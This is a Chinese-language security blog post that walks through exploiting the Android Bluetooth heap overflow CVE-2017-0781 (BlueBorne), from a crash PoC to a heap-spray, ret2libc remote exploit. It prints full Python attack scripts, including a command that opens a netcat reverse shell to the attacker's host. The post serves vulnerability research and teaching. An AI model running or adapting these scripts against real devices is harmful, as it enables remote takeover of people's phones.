<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</h1><div class="post-meta">Nov 14, 2017<span> | </span><span class="category"><a href="/categories/移动安全/">移动安全</a></span></div><div class="post-content"><p>作者: thor</p>
<p>CVE-2017-0781是最近爆出的Android蓝牙栈的严重漏洞，允许攻击者远程获取Android手机的命令执行权限，危害相当大。armis给出的文档[1]中详细介绍了该漏洞的成因，但是并没有给出PoC和exploit，我们只好根据文档中的介绍自己摸索尝试编写exploit。</p>
<h2 id="0x00-测试环境"><a href="#0x00-测试环境" class="headerlink" title="0x00 测试环境"></a>0x00 测试环境</h2><ol>
<li>Android手机: Nexus 6p  </li>
<li>Android系统版本: android 7.0 userdebug</li>
<li>Ubuntu 16 + USB蓝牙适配器</li>
</ol>
<p>为了调试方便，nexus 6p刷了自己编译的AOSP 7.0 userdebug版本。</p>
<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>CVE-2017-0781是一个堆溢出漏洞，漏洞位置在bnep_data_ind函数中，如下所示：</p>
<p><img src="/2017/11/14/blueborne/1.png" alt="1"></p>
<p>p_bcb-&gt;p_pending_data指向申请的堆内存空间，但是memcpy的时候目的地址却是p_bcb-&gt;p_pending_data + 1，复制内存时目的地址往后扩展了sizeof(p_pending_data)字节，导致堆溢出。p_pending_data指向的是一个8个字节的结构体BT_HDR，所以这里将会导致8个字节的堆溢出。<br>该漏洞看上去十分明显，但是由于这是蓝牙bnep协议的扩展部分，所以估计测试都没覆盖到。</p>
<h2 id="0x02-PoC编写"><a href="#0x02-PoC编写" class="headerlink" title="0x02 PoC编写"></a>0x02 PoC编写</h2><p>该漏洞是蓝牙协议栈中BNEP协议处理时出现的漏洞，因此PoC的编写就是要向Android手机发送伪造的bnep协议包就行了。我们这里使用pybluez实现蓝牙发包，可以直接在Ubutnu上通过pip安装。armis的文档中给出了触发漏洞的bnep协议包格式：</p>
<p><img src="/2017/11/14/blueborne/2.png" alt="1"></p>
<p>PoC如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">import bluetooth,sys</div><div class="line"></div><div class="line">def poc(target):</div><div class="line">        </div><div class="line">	pkt = &apos;\x81\x01\x00&apos;+ &apos;\x41&apos;*8 </div><div class="line"></div><div class="line">	sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)</div><div class="line"></div><div class="line">	sock.connect((target, 0xf))</div><div class="line"></div><div class="line">	for i in range(1000):</div><div class="line"></div><div class="line">	    sock.send(pkt)</div><div class="line">	    data = sock.recv(1024)</div><div class="line">	      </div><div class="line">	sock.close()</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line"></div><div class="line">   if len(sys.argv) &lt; 2:</div><div class="line">      print &apos;No target specified.&apos;</div><div class="line">      sys.exit()</div><div class="line"></div><div class="line">   target = sys.argv[1]</div><div class="line">   poc(target)</div></pre></td></tr></table></figure>
<p>简单说明一下PoC程序，我们首先通过BluetoothSocket建立与对方的L2CAP连接，类比于我们熟悉的TCP连接，然后我们在建立的L2CAP连接之上向对方发送bnep协议数据包，类比于建立TCP连接后发送的应用层数据包，而包的格式就是前面介绍的内容。我们知道触发漏洞后会覆盖堆中的内容，那么我们PoC的效果就是会用8个字节”A”覆盖堆中的某些数据。我们通过发送1000个构造的畸形数据包到对方，那么极有可能这其中就会覆盖到某些重要数据，导致蓝牙服务程序发生内存访问错误崩溃。<br>运行PoC:</p>
<p>   <code>python poc.py &lt;target&gt;</code></p>
<p>其中target是目标手机的蓝牙MAC地址，类似于wifi的MAC地址。PoC编写好后我们可以开始测试了，首先打开手机的蓝牙，然后我们在Ubuntu上运行以下脚本来查找附近的蓝牙设备：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import bluetooth</div><div class="line"></div><div class="line">nearby_devices = bluetooth.discover_devices(lookup_names=True)</div><div class="line">print(&quot;found %d devices&quot; % len(nearby_devices))</div><div class="line"></div><div class="line">for addr, name in nearby_devices:</div><div class="line">    print(&quot;  %s - %s&quot; % (addr, name))</div></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<p><img src="/2017/11/14/blueborne/6.png" alt="1"></p>
<p>发现的AOSP蓝牙设备就是我们的测试手机。直接运行PoC，并通过adb logcat 查看测试手机的日志：</p>
<p><img src="/2017/11/14/blueborne/8.png" alt="1"></p>
<p>可以看到我们的PoC直接远程让手机上的蓝牙服务崩溃，并且寄存器中出现了我们指定的内容，说明我们成功实现了堆溢出，覆盖了堆中的某些数据，导致蓝牙服务程序出现内存访问错误。至此，我们的PoC已经实现了远程使android手机蓝牙功能拒绝服务，下一步就是从堆溢出到获取命令执行权限的过程。</p>
<h2 id="0x03-exploit-编写"><a href="#0x03-exploit-编写" class="headerlink" title="0x03 exploit 编写"></a>0x03 exploit 编写</h2><p>Android使用的是jemalloc来管理堆内存，分配堆内存的时候内存块之间是没有元数据的，因此无法使用ptmalloc中覆盖元数据的漏洞利用方法。我们也是刚开始接触jemalloc，参考了[2]中的漏洞利用方法，发现由于该漏洞只能溢出8个字节的限制，似乎都不太好用。摸索好久最后发现只有期望于能够覆盖堆中的某些数据结构，而这些结构包含函数指针，从而获取代码执行权限。</p>
<p>我们知道jemalloc使用run来管理堆内存块，相同大小的堆内存在同一个run中挨着存放。因此，只要我们构造与目标数据结构相同大小的内存块，那么通过大量堆喷，则极有可能覆盖掉目标数据结构的前8个字节。该漏洞有一个优势就是我们可以控制申请的内存块大小，那么理论上我们就可以覆盖堆上绝大部分数据结构。</p>
<p>经过我们不断调试和测试，我们发现当我们申请的内存大小为32字节时，通过大量堆喷，我们可以覆盖fixed_queue_t数据结构的前8个字节，而该数据结构被蓝牙协议栈频繁使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">typedef struct fixed_queue_t &#123;</div><div class="line">  list_t* list;</div><div class="line">  semaphore_t* enqueue_sem;</div><div class="line">  semaphore_t* dequeue_sem;</div><div class="line">  std::mutex* mutex;</div><div class="line">  size_t capacity;</div><div class="line"></div><div class="line">  reactor_object_t* dequeue_object;</div><div class="line">  fixed_queue_cb dequeue_ready;</div><div class="line">  void* dequeue_context;</div><div class="line">&#125; fixed_queue_t;</div></pre></td></tr></table></figure>
<p>我们覆盖的8个字节刚好能够覆盖list指针，list结构体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct list_t &#123;</div><div class="line">  list_node_t* head;</div><div class="line">  list_node_t* tail;</div><div class="line">  size_t length;</div><div class="line">  list_free_cb free_cb;</div><div class="line">  const allocator_t* allocator;</div><div class="line">&#125; list_t;</div></pre></td></tr></table></figure>
<p>可以看到该结构体包含一个list_free_cb类型的变量，而该类型恰好为一个函数指针：</p>
<pre><code>typedef void (*list_free_cb)(void* data);
</code></pre><p>那么我们的一种漏洞利用思路就有了，就是首先通过堆喷覆盖 fixed_queue_t前8个字节，控制list指针指向我们伪造的list_t结构体，从而控制free_cb的值，达到劫持pc的目的。当我们伪造的free_cb被调用的时候，那么进程的执行就会被我们控制。我们通过查看bt/osi/src下的源文件发现free_cb会在list_free_node_函数中被调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">static list_node_t* list_free_node_(list_t* list, list_node_t* node) &#123;</div><div class="line">  CHECK(list != NULL);</div><div class="line">  CHECK(node != NULL);</div><div class="line"></div><div class="line">  list_node_t* next = node-&gt;next;</div><div class="line"></div><div class="line">  if (list-&gt;free_cb) list-&gt;free_cb(node-&gt;data);</div><div class="line">  list-&gt;allocator-&gt;free(node);</div><div class="line">  --list-&gt;length;</div><div class="line"></div><div class="line">  return next;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们继续查看调用，找到了一条触发的调用链：</p>
<pre><code>fixed_queue_try_enqueue--&gt;list_remove--&gt;list_free_node_-&gt;free_cb
</code></pre><p>而fixed_queue_try_enqueue会在蓝牙栈的协议处理时用到，所以只要我们能控制list_t结构体，就能劫持蓝牙进程的执行。</p>
<p>接下来我们需要找到伪造list_t结构体的办法。我们首先可以假设我们通过大量堆喷，在堆中放置了很多我们伪造的list_t结构体，并且通过堆喷使得某已知堆地址addr_A恰好放置了我们伪造的一个list_t结构体，那么我们只需再通过堆喷来覆盖fixed_queue_t结构体的前8个字节，包内容如下所示：</p>
<pre><code>pkt = &apos;\x81\x01\x00&apos;+ struct.pack(&apos;&lt;I&apos;, addr_A) * 8
</code></pre><p>通过这种覆盖，我们成功使得fixed_queue_t中的list指针指向我们伪造的list_t结构体，那么free_cb的执行将使我们成功劫持进程执行。</p>
<p>由上述可知，这种利用方法需要两次对喷，第一次先在堆中放置大量的list_t结构体，第二次再通过堆喷去溢出fixed_queue_t结构体。这里有一个难点就是第二次堆喷必须知道一个固定的堆地址，而这个地址需要第一次堆喷去覆盖到。一种方法是根据jemalloc的分配规则去爆破，另一种就是根据jemalloc分配规律硬编码一个地址。为了简单起见，我们使用第二种方法。我们第一次堆喷时选择堆块的大小为96字节，首先通过gdb调试观察jemalloc的分配：</p>
<p><img src="/2017/11/14/blueborne/9.png" alt="1"></p>
<p>我们多次调试发现，蓝牙进程每次重启后总有0xe6790000这条run是分配的96字节大小，那么我们可以选取这条run靠后的某个region作为我们的addr_A，这里我们选取0xe6792a00这个region：</p>
<p><img src="/2017/11/14/blueborne/10.png" alt="1"></p>
<p>还有一个问题就是由于堆喷的时候每个region的前8个字节可能会被覆盖掉，所以这里我们在放置伪造的list_t结构体时需要往后点，所以我们得到选取的addr_A为:</p>
<pre><code>addr_A =  0xe6792a00 + 8 
</code></pre><p>接下来我们开始构造list_t结构体，如下图所示：</p>
<p>   <img src="/2017/11/14/blueborne/11.png" alt="1"></p>
<p>如果一切顺利，那么通过两次堆喷，我们将会劫持到PC，而蓝牙进程会在0x41414141处崩溃，测试过程这里不再演示，我们继续下一步。顺利劫持PC后，我们怎样能执行shellcode呢？一种复杂的方式是stack pivot + ROP + shellcode，另一种简单的就是ret2libc，直接跳转到libc中的system函数，我们只需提前构造好参数就行了。</p>
<p>我们调试和测试发现，当我们劫持pc执行system函数的时候，r0寄存器负责传递命令字符串参数地址，正好指向我们控制的list-&gt;head-&gt;data，因此我们只要构造好该参数即可。最终构造好的结构如下所示：</p>
<p> <img src="/2017/11/14/blueborne/12.png" alt="1"></p>
<p>为了防止进程意外崩溃，我们还原了list_t结构体中的allocator_t结构体，包含了osi中堆分配和回收的函数地址。这里用到的3个函数地址system、osi_alloc、osi_free都可以通过CVE-2017-0785的信息泄露漏洞获取到。</p>
<p>通过以上分析，我们可以得到第一次堆喷所发送的数据包内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pkt = &apos;\x81\x01\x00&apos;+  p32(addr_A+0x20 )*2 + &apos;\x01\x00\x00\x00&apos; + p32(system_addr) + p32(addr_A + 0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ &apos;\x00&apos;*8 + p32(addr_A+0x28) + cmd_str + &apos;\x00&apos;*(48-len(cmd_str))</div></pre></td></tr></table></figure>
<p>综上所述，我们可以得到exploit脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">import bluetooth,time</div><div class="line"></div><div class="line">addr_A = 0xe6792a00 + 8</div><div class="line"></div><div class="line">cmd_str = &quot;busybox nc 192.168.2.1 8088 -e /system/bin/sh &amp;&quot; + &apos;\x00&apos;</div><div class="line"></div><div class="line"></div><div class="line">libc_base = 0xf34cf000</div><div class="line">system_addr = libc_base + 0x64a30 + 1</div><div class="line"></div><div class="line">bluetooth_base_addr = 0xeb901000</div><div class="line">osi_alloc_addr = bluetooth_base_addr + 0x15b885</div><div class="line">osi_free_addr = bluetooth_base_addr + 0x15b8e5</div><div class="line"></div><div class="line">pkt1 = &apos;\x81\x01\x00&apos;+  p32(addr_A+0x20)*2 + &apos;\x01\x00\x00\x00&apos; + p32(system_addr) + p32(addr_A+0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ &apos;\x00&apos;*8 + p32(addr_A+0x28) + cmd_str + &apos;\x00&apos;*(48-len(cmd_str)) </div><div class="line">                       </div><div class="line">pkt2 = &apos;\x81\x01\x00&apos;+ p32(addr_A) * 8</div><div class="line">  </div><div class="line">def heap_spray():</div><div class="line"></div><div class="line">	sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)</div><div class="line"></div><div class="line">	sock.connect((target, 0xf))</div><div class="line"></div><div class="line">	for i in range(500):</div><div class="line"></div><div class="line">		sock.send(pkt1)</div><div class="line">		data = sock.recv(1024)</div><div class="line">	</div><div class="line">	sock.close()</div><div class="line"></div><div class="line"></div><div class="line">def heap_overflow():</div><div class="line"></div><div class="line">	sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)</div><div class="line"></div><div class="line">	sock.connect((target, 0xf))</div><div class="line"></div><div class="line">	for i in range(3000):</div><div class="line"></div><div class="line">		sock.send(pkt2)</div><div class="line">		data = sock.recv(1024)</div><div class="line"></div><div class="line">	sock.close()</div><div class="line"></div><div class="line">	</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line"></div><div class="line">     if len(sys.argv) &lt; 2:</div><div class="line">        print &apos;No target specified.&apos;</div><div class="line">        sys.exit()</div><div class="line"></div><div class="line">     target = sys.argv[1]</div><div class="line"></div><div class="line">     print &quot;start heap spray&quot;</div><div class="line">     heap_spray()</div><div class="line"></div><div class="line">     time.sleep(10)</div><div class="line"></div><div class="line">     print &quot;start heap overflow&quot;</div><div class="line">     heap_overflow()</div></pre></td></tr></table></figure>
<p>脚本中libc.so和bluetooth.default.so的加载基址可由信息泄露漏洞获得，这里我们直接给出。脚本中通过system函数执行的是通过nc反弹shell的命令，我们首先在本地通过nc监听8088端口，然后运行exploit脚本如下：</p>
<p> <img src="/2017/11/14/blueborne/14.png" alt="1"></p>
<p> 如果两次堆喷都成功的话，我们可以在本地得到反弹的shell，用户为bluetooth:</p>
<p>  <img src="/2017/11/14/blueborne/13.png" alt="1"></p>
<p> 一般情况下执行3到5次exploit就能成功反弹shell。</p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文研究了Android蓝牙栈的远程命令执行漏洞CVE-2017-0781，探索了从PoC到编写exploit的过程，算是比较顺利地写出了exploit，还有一点缺陷就是堆中固定地址addr_A的获取，现在暂时只能根据不同手机硬编码。欢迎大家一起研究探讨！</p>
<p>##参考文献：</p>
<p>[1] <a href="">http://go.armis.com/hubfs/BlueBorne%20Technical%20White%20Paper.pdf</a><br>[2] <a href="">http://phrack.org/issues/68/10.html</a></p>
</div><div class="tags"><a href="/tags/Android/">Android</a></div><div class="post-nav"><a href="/2017/12/22/android-blueborne2/" class="pre">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a><a href="/2017/08/04/github-infoleak/" class="next">Github信息泄露升级版案例</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Malware分析/">Malware分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制安全/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/antiav/" style="font-size: 15px;">antiav</a> <a href="/tags/cknife/" style="font-size: 15px;">cknife</a> <a href="/tags/ios/" style="font-size: 15px;">ios</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/ms509/" style="font-size: 15px;">ms509</a> <a href="/tags/wannacry/" style="font-size: 15px;">wannacry</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/blueborne/">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/Moto-bootloader-exploit/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>